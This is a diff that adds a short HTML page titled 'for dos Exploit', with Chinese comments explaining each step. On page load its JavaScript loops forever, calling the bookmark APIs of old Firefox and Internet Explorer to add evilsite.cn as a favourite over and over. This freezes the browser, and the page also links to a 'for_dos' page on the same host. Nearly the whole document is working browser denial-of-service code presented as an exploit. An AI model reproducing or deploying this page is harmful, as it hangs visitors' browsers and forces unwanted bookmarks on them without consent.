@@ -1,0 +1,39 @@
+<html>
+  <title>for dos Exploit</title>
+  <head>
+    <!-- 页面标题 -->
+    <center>
+      <!-- 页面中间显示的提示信息 -->
+      <h2><kbd>Freezed/Locked - Not Responding...</kbd></h2>
+    </center>
+  </head>
+  <body>
+    <script type="text/javascript">
+      // 定义 Xploit 函数
+      function Xploit() {
+        title = "DoS"; // 设置标题
+        url = "http://www.evilsite.cn"; // 设置 URL
+        
+        // 针对不同浏览器类型添加书签
+        if (window.sidebar) {
+          window.sidebar.addPanel(title, url, ""); // 对旧版 Firefox 浏览器添加书签
+        } else if (window.external) {
+          window.external.AddFavorite(url, title); // 对 IE 浏览器添加书签
+        } else if (window.opera && window.print) {
+          return (true); // 对 Opera 浏览器执行空操作
+        }
+      }
+
+      // 无限循环调用 Xploit 函数，创建潜在的 DoS 攻击
+      for (n = 0; n < n + 1; n++)
+        Xploit();
+    </script>
+
+    <center>
+      <!-- 页面中间的链接，指向一个潜在的恶意页面 -->
+      <a href="http://www.evilsite.cn/hwbrowser/for_dos.html">
+        <i>http://www.evilsite.cn/hwbrowser/for_dos.html</i>
+      </a>
+    </center>
+  </body>
+</html>
